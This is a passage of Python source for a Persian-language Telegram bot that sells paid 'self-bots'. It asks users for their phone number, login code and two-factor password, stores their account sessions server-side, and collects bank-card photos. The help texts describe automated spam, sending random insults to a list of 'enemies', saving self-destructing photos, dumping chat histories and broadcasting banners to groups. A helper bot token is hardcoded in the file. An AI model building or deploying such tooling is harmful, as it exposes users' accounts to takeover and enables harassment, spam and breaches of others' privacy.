            await callback_query.answer("❌ فقط سازنده شرط می‌تواند آن را لغو کند.", show_alert=True)
            return
    
        if bet_data.get("finished"):
            await callback_query.answer("❌ این شرط قبلا تمام شده است.", show_alert=True)
            return
    
        amount = bet_data["amount"]
        participants = bet_data.get("participants", [])
        if not bet_data.get("refunded"):
            creator_credits = db.get("credits", creator_id, 0)
            db.set("credits", creator_id, creator_credits + amount)
            bet_data["refunded"] = True
        for participant in participants:
            uid = participant["id"]
            credits = db.get("credits", uid, 0)
            db.set("credits", uid, credits + amount)
    
        bet_data["finished"] = True
        bet_data["is_active"] = False
        db.set("group_bets", bet_key, bet_data)
    
        participants_mentions = []
        for p in participants:
            p_name = html.escape(p.get('name', 'کاربر'))
            participants_mentions.append(f'<a href="tg://user?id={p["id"]}"><b>{p_name}</b></a>')
        
        all_users_text = creator_mention
        if participants_mentions:
            all_users_text += f", {', '.join(participants_mentions)}"
    
        text = (
            "⛔ این شرط توسط سازنده لغو شد.\n\n"
            f"👤 سازنده: {creator_mention}\n"
            f"👥 سایر بازیکنان: {', '.join(participants_mentions) if participants_mentions else 'ندارد'}\n"
            f"💰 مبلغ شرط: <code>{amount}</code> سکه\n"
            "💸 مبلغ به تمام افراد (سازنده و شرکت‌کننده‌ها) برگشت داده شد."
        )
    
        try:
            await callback_query.message.edit_text(text, reply_markup=None, parse_mode=enums.ParseMode.HTML)
        except:
            pass
    
        await callback_query.answer("✅ شرط با موفقیت لغو شد.", show_alert=True)
    @bot.on_callback_query(filters.regex("check_join"))
    async def check_join(client, callback_query):
        user_id = callback_query.from_user.id
        ok, not_joined = await check_force_join(client, user_id)
    
        if ok:
            await callback_query.message.edit_text("✅ عضویت شما در همه کانال‌ها تایید شد!\nدوباره /start بزنید.")
            return
    
        buttons = []
        for ch in not_joined:
            buttons.append([InlineKeyboardButton(f"📢 عضویت در @{ch}", url=f"https://t.me/{ch}")])
    
        buttons.append([InlineKeyboardButton("🔄 بررسی مجدد", callback_data="check_join")])
    
        await callback_query.message.edit_text(
            "❌ هنوز عضو همه کانال‌ها نیستید!",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
    @bot.on_message(filters.private & filters.regex(r'^\+\d{10,15}$'))
    async def handle_phone(client, message: Message):
        user_id, phone = message.from_user.id, message.text
        
        if user_id in active_clients:
            try:
                await active_clients[user_id].disconnect()
                del active_clients[user_id]
            except:
                pass
        
        credits = db.get("credits", user_id, 0)
        if credits <= 0:
            await message.reply_text(f"❌ سکه کافی ندارید!\nسکه های شما: {credits}")
            return
        
        try:
            session_name = f"sessions/{user_id}"
            temp_client = Client(session_name, api_id=API_ID, api_hash=API_HASH)
            await temp_client.connect()
            
            active_clients[user_id] = temp_client
            sent_code = await temp_client.send_code(phone)
            user_data = db.get("users", user_id, {})
            user_data["phone"] = phone
            db.set("users", user_id, user_data)
            await message.reply_text(
                "✅ **کد تأیید ارسال شد**\n\n"
                "🔢 **کد ۵ رقمی را با دکمه‌های زیر وارد کنید:**\n\n"
                f"<b><code>{format_code_display('')}</code></b>\n\n"
                "📱 کد ارسال شده به شماره شما",
                reply_markup=create_numpad_keyboard(),
                parse_mode=enums.ParseMode.HTML
            )
            
            db.set("temp_data", user_id, {
                "phone": phone, 
                "phone_code_hash": sent_code.phone_code_hash,
                "client_active": True
            })
            
        except Exception as e:
            await message.reply_text(f"❌ **خطا:** {str(e)}")
            if user_id in active_clients:
                try:
                    await active_clients[user_id].disconnect()
                    del active_clients[user_id]
                except:
                    pass
    @bot.on_message(filters.private & filters.text)
    async def handle_all_messages(client, message: Message):
        user_id = message.from_user.id
        text = message.text
        if db.get("temp_data", f"waiting_coins_{user_id}"):
            try:
                coins_amount = int(text)
                if coins_amount <= 0:
                    await message.reply_text("❌ تعداد سکه باید بیشتر از صفر باشد")
                    return
                
                toman_amount = coins_amount * TOMAN_PER_COIN
                
                payment_data = {
                    "user_id": user_id,
                    "coins": coins_amount,
                    "toman": toman_amount,
                    "timestamp": time.time(),
                    "status": "pending",
                    "first_name": message.from_user.first_name or "",
                    "username": message.from_user.username or ""
                }
                
                db.set("payments", user_id, payment_data)
                db.delete("temp_data", f"waiting_coins_{user_id}")
                
                payment_text = (
                    f"💳 **برای پرداخت لطفا مبلغ {toman_amount:,.0f} تومان به حساب زیر واریز کنید:**\n\n"
                    f"🏦 **بانک:** {card_info['bank_name']}\n"
                    f"🔢 **شماره کارت:** `{card_info['card_number']}`\n"
                    f"👤 **به نام:** {card_info['card_owner']}\n\n"
                    f"💎 **تعداد سکه دریافتی:** {coins_amount} سکه\n\n"
                    f"📸 **پس از واریز، رسید یا عکس پرداخت را ارسال کنید**\n"
                    f"⏰ پرداخت شما حداکثر تا 24 ساعت بررسی خواهد شد"
                )
                
                keyboard = InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 انصراف", callback_data="increase_balance")]
                ])
                
                await message.reply_text(payment_text, reply_markup=keyboard)
                db.set("temp_data", f"waiting_payment_proof_{user_id}", True)
                
            except ValueError:
                await message.reply_text("❌ لطفا یک عدد معتبر وارد کنید")
            return
    
        temp_data = db.get("temp_data", user_id)
        if temp_data and temp_data.get("needs_password"):
            try:
                if user_id not in active_clients:
                    await message.reply_text("❌ کلاینت فعال نیست. لطفا دوباره شماره را ارسال کنید.")
                    return
                
                user_client = active_clients[user_id]
                await user_client.check_password(text)
                
                user_info = {
                    "phone": temp_data["phone"],
                    "status": "active",
                    "created_at": time.time(),
                    "last_active": time.time(),
                    "verified": db.get("users", user_id, {}).get("verified", False)
                }
                db.set("users", user_id, user_info)
                db.delete("temp_data", user_id)
                
                if user_id in active_clients:
                    try:
                        await active_clients[user_id].disconnect()
                        del active_clients[user_id]
                    except:
                        pass
                
                if run_selfbot(user_id, temp_data["phone"]):
                    credits = db.get("credits", user_id, 0)
                    await message.reply_text(
                        f"✅ **سلف بات فعال شد!**\n\n"
                        f"💰 سکه های شما: {credits}\n"
                        f"⏰ زمان باقی‌مانده: {credits} ساعت"
                    )
                else: 
                    await message.reply_text("❌ خطا در اجرای سلف")
                
            except Exception as e: 
                await message.reply_text(f"❌ رمز اشتباه: {str(e)}")
            return
    
        if user_id == ADMIN_ID:
            set_target = db.get("temp_data", f"admin_set_{user_id}")
            if set_target and text.isdigit():
                amount = int(text)
                db.delete("temp_data", f"admin_set_{user_id}")
                db.set("credits", set_target, amount)
                
                await message.reply_text(f"✅ سکه کاربر {set_target} تنظیم شد به {amount}")
                
                try:
                    await bot.send_message(set_target, f"🔧 موجودی سکه شما تنظیم شد\n💰 جدید: {amount} سکه")
                except: 
                    pass
                return
        
        pass
    @bot.on_message(filters.photo & filters.private)
    async def handle_card_photo(client, message: Message):
        user_id = message.from_user.id
        
        if db.get("temp_data", f"waiting_card_photo_{user_id}"):
            verification_data = {
                "user_id": user_id,
                "first_name": message.from_user.first_name or "",
                "username": message.from_user.username or "",
                "photo_id": message.photo.file_id,
                "timestamp": time.time(),
                "status": "pending"
            }
            
            db.set("verifications", user_id, verification_data)
            db.delete("temp_data", f"waiting_card_photo_{user_id}")
            
            admin_text = f"🆕 **درخواست احراز هویت جدید**\n\n"
            admin_text += f"👤 **کاربر:** {verification_data['first_name']}\n"
            admin_text += f"🆔 **آیدی:** `{user_id}`\n"
            admin_text += f"📧 **یوزرنیم:** @{verification_data['username']}\n"
            admin_text += f"⏰ **زمان:** {time.ctime()}"
            
            keyboard = InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("✅ تایید", callback_data=f"verify_approve_{user_id}"),
                    InlineKeyboardButton("❌ رد", callback_data=f"verify_reject_{user_id}")
                ]
            ])
            
            try:
                await message.forward(ADMIN_ID)
                await bot.send_message(ADMIN_ID, admin_text, reply_markup=keyboard)
                
                await message.reply_text(
                    "✅ **عکس شما دریافت شد و برای تایید به ادمین ارسال شد**\n\n"
                    "⏳ لطفا منتظر تایید ادمین باشید\n"
                    "🔔 پس از تایید به شما اطلاع داده خواهد شد",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 بازگشت", callback_data="back")]])
                )
            except Exception as e:
                await message.reply_text("❌ خطا در ارسال به ادمین. لطفا بعدا تلاش کنید.")
        
        elif db.get("temp_data", f"waiting_payment_proof_{user_id}"):
            payment_data = db.get("payments", user_id)
            if not payment_data:
                await message.reply_text("❌ اطلاعات پرداخت یافت نشد. لطفا دوباره تلاش کنید.")
                return
            
            payment_data["proof_photo_id"] = message.photo.file_id
            payment_data["proof_sent_at"] = time.time()
            db.set("payments", user_id, payment_data)
            
            admin_text = (
                f"💰 **درخواست افزایش موجودی جدید**\n\n"
                f"👤 **کاربر:** {message.from_user.first_name or 'ناشناس'}\n"
                f"🆔 **آیدی:** `{user_id}`\n"
                f"📧 **یوزرنیم:** @{message.from_user.username or 'ندارد'}\n"
                f"💎 **تعداد سکه:** {payment_data['coins']}\n"
                f"💵 **مبلغ:** {payment_data['toman']:,.0f} تومان\n"
                f"⏰ **زمان:** {time.ctime()}"
            )
            
            keyboard = InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("✅ تایید پرداخت", callback_data=f"payment_approve_{user_id}"),
                    InlineKeyboardButton("❌ رد پرداخت", callback_data=f"payment_reject_{user_id}")
                ]
            ])
            
            try:
                await message.forward(ADMIN_ID)
                await bot.send_message(ADMIN_ID, admin_text, reply_markup=keyboard)
                
                await message.reply_text(
                    "✅ **رسید پرداخت شما دریافت شد و برای تایید به ادمین ارسال شد**\n\n"
                    "⏳ لطفا منتظر تایید ادمین باشید\n"
                    "🔔 پس از تایید، سکه ها به حساب شما اضافه خواهد شد",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 بازگشت", callback_data="back")]])
                )
                
                db.delete("temp_data", f"waiting_payment_proof_{user_id}")
                
            except Exception as e:
                await message.reply_text("❌ خطا در ارسال به ادمین. لطفا بعدا تلاش کنید.")
    @bot.on_callback_query(filters.regex("increase_balance"))
    async def increase_balance_handler(client, callback_query):
        user_id = callback_query.from_user.id
        ok, not_joined = await check_force_join(client, user_id)
        if not ok:
            buttons = []
            for ch in not_joined:
                buttons.append([InlineKeyboardButton(f"📢 عضویت در @{ch}", url=f"https://t.me/{ch}")])
            buttons.append([InlineKeyboardButton("🔄 بررسی عضویت", callback_data="check_join")])
            
            await callback_query.message.edit_text(
                "❌ برای استفاده از ربات باید در تمام کانال‌های زیر عضو شوید:",
                reply_markup=InlineKeyboardMarkup(buttons)
            )
            return
        
        user_data = db.get("users", user_id, {})
        if user_data.get('rejected'):
            await callback_query.answer("❌ حساب شما توسط ادمین رد شده است. امکان افزایش موجودی ندارید.", show_alert=True)
            return
        if not user_data.get('verified'):
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("● احراز هویت ●", callback_data="start_verification")],
                [InlineKeyboardButton("🔙 بازگشت", callback_data="back")]
            ])
            
            await callback_query.message.edit_text(
                "🔒 **برای افزایش موجودی نیاز به احراز هویت دارید**\n\n"
                "📋 **مراحل احراز هویت:**\n"
                "1️⃣ کلیک روی دکمه 'احراز هویت'\n"
                "2️⃣ ارسال عکس از کارت بانکی\n"
                "3️⃣ تایید توسط ادمین\n"
                "4️⃣ افزایش موجودی\n\n"
                "⚠️ **توجه:** اطلاعات حساس (CVV2، تاریخ انقضا) در عکس پوشیده شود",
                reply_markup=keyboard
            )
            return
        else:
            await callback_query.message.edit_text(
                "💰 **افزایش موجودی**\n\n"
                f"💎 **نرخ تبدیل:** هر {COIN_RATE} سکه = 50,000 تومان\n"
                f"💵 **قیمت هر سکه:** {TOMAN_PER_COIN:.0f} تومان\n\n"
                "🔢 **تعداد سکه مورد نظر خود را وارد کنید:**\n"
                "مثال: 1440\n\n"
                "💡 **توجه:** فقط عدد وارد کنید (بدون نقطه یا کاما)",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 بازگشت", callback_data="back")]])
            )
            
            db.delete("temp_data", f"waiting_coins_{user_id}")
            db.set("temp_data", f"waiting_coins_{user_id}", True)
            await callback_query.answer("✅ لطفا تعداد سکه مورد نظر را وارد کنید")
    def main():
        print("● ربات سلف ساز روشن شد ●")
        try: 
            bot.run()
        except KeyboardInterrupt: 
            print("\n🛑 توقف ربات...")
        except Exception as e: 
            print(f"❌ خطا: {e}")
        finally: 
            stop_all_selfbots()
            print("✅ ربات متوقف شد")
    
    if __name__ == "__main__":
        main()
    

    # ============================================================================
    #                          HELPER BOT (python-telegram-bot)
    # ============================================================================
    try:
        from telegram import (
            Update,
            InlineKeyboardButton as TgInlineButton,
            InlineKeyboardMarkup as TgInlineMarkup,
            InlineQueryResultArticle as TgInlineQueryResultArticle,
            InputTextMessageContent as TgInputTextMessageContent
        )
        from telegram.ext import (
            Application, CallbackQueryHandler, ContextTypes,
            InlineQueryHandler, MessageHandler, filters as TgFilters
        )
        import logging as tg_logging
        tg_logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=tg_logging.INFO)
        HELPER_AVAILABLE = True
        from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InlineQueryResultArticle, InputTextMessageContent
        from telegram.ext import Application, CallbackQueryHandler, ContextTypes, InlineQueryHandler, MessageHandler, filters
        import logging
        
        TOKEN = "8999820799:AAHmXshiLZxDXJkEyEQqplCyfuSVm3H2vPg" # توکن ربات هلپر
        
        # توجه برای اینکه هلپر کار کنه بابد بخش اینلاین مود ربات رو توی بات فادر فعال کنید
        
        logging.basicConfig(
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            level=logging.INFO
        )
        logger = logging.getLogger(__name__)
        
        HELP_TEXTS = {
            "time": """
        ⏰ <b>مدیریت تایم</b>
        
        <b>دستورات قابل کپی:</b>
        <code>تایم روشن</code>
        <code>تایم خاموش</code>
        
        <b>کاربرد:</b>
        نمایش زمان کنار نام کاربری
        آپدیت خودکار هر دقیقه
        فونت‌های مختلف برای زمان
        
        <b>فونت‌های موجود:</b>
        𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗 - فونت 1
        𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵 - فونت 2  
        ０１２３４５６７８９ - فونت 3
        𝟢𝟣𝟤𝟥𝟦𝟧𝟨𝟩𝟪𝟫 - فونت 4
        𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡 - فونت 5
        0҉1҉2҉3҉4҉5҉6҉7҉8҉9҉ - فونت 6
        """,
        
            "instagram": """
        📥 <b>دانلودر اینستاگرام</b>
        
        <b>دستور قابل کپی:</b>
        <code>اینستا لینک_پست</code>
        
        <b>مثال‌ها:</b>
        <code>اینستا https://www.instagram.com/reel/DOkym3fCFqg/</code>
        <code>اینستا https://www.instagram.com/p/CzuF4KQqJ7q/</code>
        <code>اینستا https://www.instagram.com/tv/Cxxxxxxxx/</code>
        
        <b>کاربرد:</b>
        • دانلود پست‌های اینستاگرام
        • دانلود ریل‌ ها و ویدیو ها
        • دانلود عکس‌های پست
        
        <b>قابلیت‌ها:</b>
        ✅ دانلود با کیفیت اصلی
        ✅ نمایش توضیحات پست
        ✅ نمایش اطلاعات کاربر
        ✅ آپلود در همان چت
        """,
        
            "id": """
        🆔 <b>سیستم آیدی پیشرفته</b>
        
        <b>دستور قابل کپی:</b>
        <code>ایدی</code>
        
        <b>دو حالت استفاده:</b>
        
        1️⃣ <b>بدون ریپلای:</b>
        <code>ایدی</code>
        • نمایش اطلاعات خودتان
        • نمایش اطلاعات چت فعلی
        • نمایش آیدی عددی
        
        2️⃣ <b>با ریپلای:</b>
        <code>ایدی</code> (روی پیام کاربر ریپلای)
        • نمایش اطلاعات کامل کاربر
        • نمایش گروه‌های مشترک  
        • نمایش آیدی و یوزرنیم
        
        <b>اطلاعات نمایش داده شده:</b>
        ✅ آیدی عددی کاربر
        ✅ یوزرنیم و نام کامل
        ✅ وضعیت پریمیوم
        ✅ تعداد عکس‌های پروفایل
        ✅ آیدی چت و عنوان
        ✅ تعداد اعضا (در گروه)
        ✅ گروه‌های مشترک (در صورت وجود)
        
        <b>مثال خروجی:</b>
        • اطلاعات شما + چت فعلی
        • یا اطلاعات کاربر ریپلای شده
        """,
        
            "photo": """
        📸 <b>ذخیره عکس تایمدار</b>
        
        <b>دستور قابل کپی:</b>
        <code>عکس سیو</code> (ریپلای روی عکس)
        
        <b>کاربرد:</b>
        ذخیره دستی عکس‌های تایمدار
        ارسال اطلاعات کامل کاربر
        
        <b>نکته:</b>
        فقط روی عکس‌های تایمدار کار می‌کند
        عکس معمولی قابل ذخیره نیست
        """,
        
            "backup": """
        💾 <b>پشتیبان‌گیری</b>
        
        <b>دستور قابل کپی:</b>
        <code>سیو @یوزرنیم</code>
        
        <b>مثال:</b>
        <code>سیو @username</code>
        
        <b>کاربرد:</b>
        ذخیره تاریخچه چت در فایل متنی
        ارسال فایل به پیام‌های ذخیره شده
        """,
        
            "font": """
        🔤 <b>مدیریت فونت</b>
        
        <b>دستورات قابل کپی:</b>
        <code>لیست فونت</code>
        <code>تنظیم فونت 1</code> تا <code>تنظیم فونت 6</code>
        
        <b>کاربرد:</b>
        تغییر فونت نمایش زمان
        پیش‌نمایش فونت‌های مختلف
        اعمال فونت روی زمان به صورت زنده
        """,
        
            "price": """
        💱 <b>قیمت ارز</b>
        
        <b>دستور قابل کپی:</b>
        <code>قیمت ارز</code>
        
        <b>مثال‌ها:</b>
        <code>قیمت BTC</code>
        <code>قیمت ETH</code>
        <code>قیمت TON</code>
        
        <b>کاربرد:</b>
        نمایش قیمت لحظه‌ای ارزهای دیجیتال
        نمایش قیمت تومانی و دلاری
        نمایش تغییرات 24 ساعته
        میتوانید اسم ارزو رو به فارسی بزارید
        """,
        
            "spam": """
        🔁 <b>ارسال اسپم</b>
        
        <b>دستور قابل کپی:</b>
        <code>اسپم تعداد متن</code>
        
        <b>مثال‌ها:</b>
        <code>اسپم 10 سلام</code>
        <code>اسپم 5 تست</code>
        
        <b>کاربرد:</b>
        ارسال پیام تکراری
        حداکثر 50 پیام در یک دستور
        قابلیت ریپلای روی پیام
        """,
        
            "format": """
        🎨 <b>سیستم فرمت خودکار HTML</b>
        
        <b>دستورات قابل کپی:</b>
        <code>فرمت بولد روشن</code>
        <code>فرمت بولد خاموش</code>
        <code>فرمت ایتالیک روشن</code>
        <code>فرمت ایتالیک خاموش</code>
        <code>فرمت زیرخط روشن</code>
        <code>فرمت زیرخط خاموش</code>
        <code>فرمت خط‌خورده روشن</code>
        <code>فرمت خط‌خورده خاموش</code>
        <code>فرمت اسپویلر روشن</code>
        <code>فرمت اسپویلر خاموش</code>
        <code>فرمت کد روشن</code>
        <code>فرمت کد خاموش</code>
        <code>فرمت پیش‌فرمت روشن</code>
        <code>فرمت پیش‌فرمت خاموش</code>
        <code>فرمت نقل‌قول روشن</code>
        <code>فرمت نقل‌قول خاموش</code>
        <code>فرمت وضعیت</code>
        <code>فرمت ریست</code>
        
        <b>کاربرد:</b>
        تبدیل خودکار پیام‌ ها به فرمت‌ های مختلف
        پشتیبانی از تمام تگ‌های HTML تلگرام
        امکان استفاده همزمان از چندین فرمت
        
        <b>فرمت‌های پشتیبانی شده:</b>
        • <b>بولد</b> - <b>متن بولد</b>
        • <i>ایتالیک</i> - <i>متن ایتالیک</i>
        • <u>زیرخط</u> - <u>متن زیرخط دار</u>
        • <s>خط‌خورده</s> - <s>متن خط خورده</s>
        • <code>کد</code> - <code>متن کد</code>
        • <pre>پیش‌فرمت</pre> - <pre>متن پیش‌فرمت</pre>
        • <blockquote>نقل‌قول</blockquote> - <blockquote>متن نقل قول</blockquote>
        """,
        
            "enemy": """
        👿 <b>مدیریت دشمنان</b>
        
        <b>دستورات قابل کپی:</b>
        <code>دشمن</code> (ریپلای روی پیام کاربر)
        <code>حذف دشمن</code> (ریپلای روی پیام کاربر)
        <code>لیست دشمن</code>
        <code>دشمنان</code>
        <code>پاک کردن دشمنان</code>
        
        <b>کاربرد:</b>
        افزودن کاربر به لیست دشمنان
        ارسال خودکار فحش رندوم به دشمنان
        مدیریت لیست دشمنان
        نمایش اطلاعات کامل دشمنان
        حذف دشمن از لیست
        """,
        
            "autoreply": """
        🤖 <b>پاسخ خودکار</b>
        
        <b>دستورات قابل کپی:</b>
        <code>پاسخ افزودن سلام|سلام چطوری</code>
        <code>پاسخ حذف سلام</code>
        <code>پاسخ لیست</code>
        
        <b>مثال‌ها:</b>
        <code>پاسخ افزودن سلا|سلام عزیزم</code>
        <code>پاسخ افزودن چطوری|خوبم ممنون</code>
        <code>پاسخ حذف سلا</code>
        
        <b>کاربرد:</b>
        تنظیم پاسخ خودکار برای کلمات خاص
        لیست پاسخ‌ های تنظیم شده
        """,
        
            "insult": """
        💢 <b>مدیریت فحش‌ها</b>
        
        <b>دستورات قابل کپی:</b>
        <code>فحش افزودن متن فحش</code>
        <code>فحش حذف متن فحش</code>
        
        <b>مثال‌ها:</b>
        <code>فحش افزودن تو احمقی</code>
        <code>فحش افزودن برو گمشو</code>
        <code>فحش حذف تو احمقی</code>
        
        <b>کاربرد:</b>
        افزودن فحش‌های جدید به لیست
        حذف فحش ‌های موجود
        ارسال رندوم فحش به دشمنان
        """,
        
            "online": """
        🌐 <b>حالت همیشه آنلاین</b>
        
        <b>دستورات قابل کپی:</b>
        <code>آنلاین روشن</code>
        <code>آنلاین خاموش</code>
        
        <b>کاربرد:</b>
        فعال کردن حالت همیشه آنلاین
        نمایش آنلاین دائمی در تلگرام
        مناسب برای نشان دادن فعالیت دائمی
        """,
        
            "lock": """
        🔒 <b>سیستم قفل پیوی</b>
        
        <b>دستورات قابل کپی:</b>
        <code>همه روشن</code>
        <code>همه خاموش</code>
        <code>مدیا روشن</code>
        <code>مدیا خاموش</code>
        <code>استیکر روشن</code>
        <code>استیکر خاموش</code>
        <code>فوروارد روشن</code>
        <code>فوروارد خاموش</code>
        <code>وویس روشن</code>
        <code>وویس خاموش</code>
        <code>پیام روشن</code>
        <code>پیام خاموش</code>
        <code>فایل روشن</code>
        <code>فایل خاموش</code>
        <code>وضعیت قفل</code>
        <code>ریست قفل</code>
        <code>راهنمای قفل</code>
        
        <b>کاربرد:</b>
        محدود کردن ارسال انواع پیام در پیوی
        حذف خودکار پیام‌های غیرمجاز
        مدیریت دسترسی ‌های کاربران
        نمایش وضعیت قفل ‌ها
        """,
        
            "antilogin": """
        🛡️ <b>سیستم انتی لاگین</b>
        
        <b>دستورات قابل کپی:</b>
        <code>انتی لاگین روشن</code>
        <code>انتی لاگین خاموش</code>
        <code>انتی لاگین</code>
        
        <b>کاربرد:</b>
        منقضی کردن کد اتوماتیک
        جلوگیری از ورود به اکانت
        """,
        
            "reaction": """
        🎭 <b>سیستم ریکشن خودکار</b>
        
        <b>دستورات قابل کپی:</b>
        <code>ریکت ایموجی</code> (ریپلای روی کاربر)
        <code>حذف ریکت</code> (ریپلای روی کاربر)
        <code>لیست ریکت</code>
        <code>پاکسازی ریکت</code>
        
        <b>مثال‌ها:</b>
        <code>ریکت 🚀</code> (ریپلای)
        <code>ریکت ❤️</code> (ریپلای)
        <code>حذف ریکت</code> (ریپلای)
        
        <b>کاربرد:</b>
        تنظیم ریکشن خودکار برای کاربران خاص
        اعمال ریکشن روی تمام پیام‌ های کاربر
        مدیریت لیست ریکشن‌ ‌ها
        حذف ریکشن کاربران
        """,
        
            "edit": """
        ✏️ <b>ویرایش سریع پیام</b>
        
        <b>دستور قابل کپی:</b>
        <code>ویرایش کلمه_قدیمی به کلمه_جدید</code> (ریپلای)
        
        <b>مثال‌ها:</b>
        <code>ویرایش سلان به سلام</code>
        <code>ویرایش احمق به عزیز</code>
        <code>ویرایش بد به خوب</code>
        
        <b>کاربرد:</b>
        جایگزینی سریع کلمه در پیام
        ریپلای روی پیام مورد نظر
        حذف خودکار پیام دستور
        جایگزینی فقط کلمه مشخص شده
        """,
        
            "banner": """
        📢 <b>سیستم مدیریت بنر</b>
        
        <b>دستورات قابل کپی:</b>
        <code>تنظیم بنر</code> (ریپلای روی پیام)
        <code>بنر همگانی کد</code>
        <code>لیست بنرها</code>
        <code>بنر همگانی خاموش</code>
        <code>بنر ارسال کد</code>
        <code>زمان بنر دقیقه</code>
        
        <b>مثال‌ها:</b>
        <code>تنظیم بنر</code> (ریپلای)
        <code>بنر همگانی 1</code>
        <code>بنر ارسال 1</code>
        <code>زمان بنر 5</code>
        
        <b>کاربرد:</b>
        ثبت پیام به عنوان بنر
        ارسال همگانی به گروه‌ها و سوپرگروه ‌ها
        مدیریت بنرهای ثبت شده
        تنظیم زمان بین ارسال‌ ها
        ارسال فوری بنر
        """,
        
            "download": """
        📥 <b>دانلودر تلگرام</b>
        
        <b>دستور قابل کپی:</b>
        <code>دانلود لینک_پست</code>
        
        <b>مثال‌ها:</b>
        <code>دانلود https://t.me/channel/123</code>
        <code>دانلود https://t.me/username/456</code>
        <code>دانلود https://t.me/c/channel_id/post_id</code>
        
        💡 <b>کاربرد اصلی:</b>
        دانلود پست کانال های اسکم یا گروه ها
        """,
            "new": """
        🆕 <b>دستورات مربوط به کانال و گروه</b>
        
        <b>دستورات قابل کپی:</b>
        <code>پینگ</code>
        <code>تعداد کانال ها</code>
        <code>تعداد گروه ها</code>
        <code>خروج همه کانال</code>
        <code>خروج همه گروه</code>
        
        <b>کاربرد:</b>
        • <code>پینگ</code> - بررسی سرعت ربات
        • <code>تعداد کانال ها</code> - نمایش آمار دقیق کانال‌ها
        • <code>تعداد گروه ها</code> - نمایش آمار دقیق گروه‌ها
        • <code>خروج همه کانال</code> - خروج از تمام کانال‌ها با تاخیر
        • <code>خروج همه گروه</code> - خروج از تمام گروه‌ها با تاخیر
        
        <b>نکته:</b>
        تاخیر 4 ثانیه‌ ای برای جلوگیری از محدودیت
        """,
        }
        
        def get_main_menu_page1(user_id):
            """صفحه اول - دکمه‌های رنگی با چیدمان جدید"""
            keyboard = [
                [
                    InlineKeyboardButton("● ایدی ●", callback_data=f"help_id_{user_id}_1", style="primary"),
                    InlineKeyboardButton("● تایم ●", callback_data=f"help_time_{user_id}_1", style="primary")
                ],
                [
                    InlineKeyboardButton("● عکس تایمدار ●", callback_data=f"help_photo_{user_id}_1", style="primary"),
                ],
                [
                    InlineKeyboardButton("● پشتیبان‌گیری ●", callback_data=f"help_backup_{user_id}_1", style="success"),
                    InlineKeyboardButton("● مدیریت فونت ●", callback_data=f"help_font_{user_id}_1", style="success")
                ],
                [
                    InlineKeyboardButton("● قیمت ارز ●", callback_data=f"help_price_{user_id}_1", style="success"),
                ],
                [
                    InlineKeyboardButton("● فرمت متن ●", callback_data=f"help_format_{user_id}_1", style="danger"),
                    InlineKeyboardButton("● اسپم ●", callback_data=f"help_spam_{user_id}_1", style="danger")
                ],
                [
                    InlineKeyboardButton("● مدیریت دشمنان ●", callback_data=f"help_enemy_{user_id}_1", style="danger"),
                ],
                [
                    InlineKeyboardButton("● پاسخ خودکار ●", callback_data=f"help_autoreply_{user_id}_1", style="primary"),
                ],
                [
                    InlineKeyboardButton("● صفحه 2 → ●", callback_data=f"help_page2_{user_id}", style="success"),
                    InlineKeyboardButton("● بست ●", callback_data=f"help_close_{user_id}", style="danger")
                ]
            ]
            return InlineKeyboardMarkup(keyboard)
        
        def get_main_menu_page2(user_id):
            """صفحه دوم - دکمه‌های رنگی با چیدمان جدید"""
            keyboard = [
                [
                    InlineKeyboardButton("● سیستم فحش ●", callback_data=f"help_insult_{user_id}_2", style="danger"),
                    InlineKeyboardButton("● همیشه آنلاین ●", callback_data=f"help_online_{user_id}_2", style="danger")
                ],
                [
                    InlineKeyboardButton("● قفل پیوی ●", callback_data=f"help_lock_{user_id}_2", style="danger"),
                ],
                [
                    InlineKeyboardButton("●️ انتی لاگین ●", callback_data=f"help_antilogin_{user_id}_2", style="primary"),
                    InlineKeyboardButton("● ریکشن خودکار ●", callback_data=f"help_reaction_{user_id}_2", style="primary")
                ],
                [
                    InlineKeyboardButton("● ویرایش سریع ●", callback_data=f"help_edit_{user_id}_2", style="primary"),
                ],
                [
                    InlineKeyboardButton("● سیستم بنر ●", callback_data=f"help_banner_{user_id}_2", style="success"),
                    InlineKeyboardButton("● اینستاگرام ●", callback_data=f"help_instagram_{user_id}_2", style="success")
                ],
                [
                    InlineKeyboardButton("● دانلود تلگرام ●", callback_data=f"help_download_{user_id}_2", style="success"),
                ],
                [
                    InlineKeyboardButton("● مدیریت گروه/کانال ●", callback_data=f"help_new_{user_id}_2", style="primary"),
                ],
                [
                    InlineKeyboardButton("← صفحه 1", callback_data=f"help_page1_{user_id}", style="primary"),
                    InlineKeyboardButton("❌ بستن", callback_data=f"help_close_{user_id}", style="danger")
                ]
            ]
            return InlineKeyboardMarkup(keyboard)
        
        def get_back_button(user_id, from_page=1):
            return InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 بازگشت", callback_data=f"help_back_{user_id}_{from_page}", style="primary")]
            ])
        
        def get_reopen_button(user_id):
            return InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 بازکردن پنل", callback_data=f"help_reopen_{user_id}", style="success")]
            ])
        
        async def show_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
            user_id = update.effective_user.id
            text = "<b>🎛 پنل مدیریت سلف</b>\n\n💡 <i>صفحه اول - 10 قابلیت اصلی</i>"
            await update.message.reply_text(text, reply_markup=get_main_menu_page1(user_id), parse_mode='HTML')
        
        async def handle_inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
            query = update.inline_query.query.strip().lower()
            
            if query == "panel":
                user_id = update.inline_query.from_user.id
                
                results = [
                    InlineQueryResultArticle(
                        id="1",
                        title="🎛 پنل مدیریت سلف - صفحه 1",
                        description="10 قابلیت اصلی - مدیریت کامل",
                        input_message_content=InputTextMessageContent(
